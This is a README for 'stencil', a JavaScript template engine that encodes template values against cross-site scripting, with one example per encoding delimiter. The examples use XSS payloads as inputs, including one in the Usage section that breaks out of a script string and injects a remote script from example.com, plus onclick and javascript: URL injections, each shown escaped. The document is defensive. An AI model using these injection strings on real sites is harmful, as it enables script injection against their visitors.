# stencil

A lightweight template engine with comprehensive encoding methods for mitigating
the risk of cross-site scripting (XSS) attacks.

## Installation

```
npm install https://github.com/mikol/stencil
```

## Usage

```
var template = '<script>alert("Hello, !{name}!")</script>';
var locals = {
  name: '");' +
    'var $dq=document;' +
    'var $xp=$dq.createElement("script");' +
    '$xp.setAttribute("src", "https://example.com/xss.js");' +
    '$dq.getElementsByTagName("head")[0].appendChild($xp);'
};

stencil(template, locals);

// <script>alert("Hello, \x22\x29\x3bvar\x20\x24dq\x3ddocument\x3bvar\x20\
// \x24xp\x3d\x24dq\x2ecreateElement\x28\x22script\x22\x29\x3b\x24xp\x2e\
// setAttribute\x28\x22src\x22\x2c\x20\x22https\x3a\x2f\x2fexample\x2ecom\x2f\
// xss\x2ejs\x22\x29\x3b\x24dq\x2egetElementsByTagName\x28\x22 head\x22\x29\
// \x5b0\x5d\x2eappendChild\x28\x24xp\x29\x3b!");</script>
```

## Encoding Delimiters

### Echo (`${...}`)

```
stencil('Hello, ${name}!', {name: 'Ŵøяłð"&\'/<>`'});
```

```
Hello, Ŵøяłð"&'/<>`!
```

### Base64 (`+{...}`)

```
stencil('Hello, +{name}!', {name: 'Ŵ🜘я🜯🜱'});
```

```
Hello, xbTwn5yY0Y/wn5yv8J+csQ==!
```

### Base64ni (`-{...}`)

```
stencil('Hello, -{name}!', {name: 'Ŵ🜘я🜯🜱'});
```

```
Hello, xbTwn5yY0Y_wn5yv8J-csQ!
```

### CSS Properties (`:{...}`)

```
stencil('<style>background-url: :{property};</style>', {
  property: 'javascript:alert(1)'
});
```

```
<style>background-url: javascript\00003aalert\0000281\000029;</style>
```

### HTML Attributes (`={...}`)

```
stencil('<span class="={cname}">Hello, World!</span>', {
  cname: '"\'%*+,-/<;>^| = risqué busịness'
});
```

```
<span class="&#34;&#39;&#37;&#42;&#43;&#44;&#45;&#47;&lt;&#59;&gt;&#94;&#124;&#32;&#61;&#32;risqu&#233;&#32;busịness">Hello, World!</span>
```

### HTML Elements (`>{...}`)

```
stencil('<span>Hello, >{name}!</span>', {
  name: '<script>alert(1);</script>'
});
```

```
<span>Hello, &lt;script&gt;alert(1);&lt;&#47;script&gt;!</span>
```

### JavaScript (`!{...}`)

```
stencil('<script>alert("Hello, !{name}!")</script>', {
  name: '");alert(1);"'
});
```

```
<script>alert("Hello, \x22\x29\x3balert\x281\x29\x3b\x22!")</script>
```

### URI Components (`%{...}`)

```
stencil('<a href="/help/kbid=%{kbid}">...</a>', {
  kbid: '" onclick="alert(1)'
});
```

```
<a href="/help/kbid=%22%20onclick%3d%22alert%281%29">...</a>
```
